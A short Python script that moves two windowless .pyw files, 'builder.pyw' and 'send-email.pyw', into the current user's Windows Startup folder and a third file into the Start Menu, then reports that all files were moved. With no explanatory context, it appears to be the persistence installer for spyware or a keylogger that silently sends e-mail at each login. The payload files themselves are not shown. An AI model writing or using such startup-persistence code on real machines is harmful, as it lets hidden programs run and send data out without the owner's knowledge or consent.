import shutil
import datetime
import getpass

now = datetime.datetime.now() #time
username = getpass.getuser()  #user

shutil.move("builder.pyw", "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
shutil.move("send-email.pyw", "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
shutil.move("Sync.ResLaunch.txt", "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu")

print('[*] All files moved.')

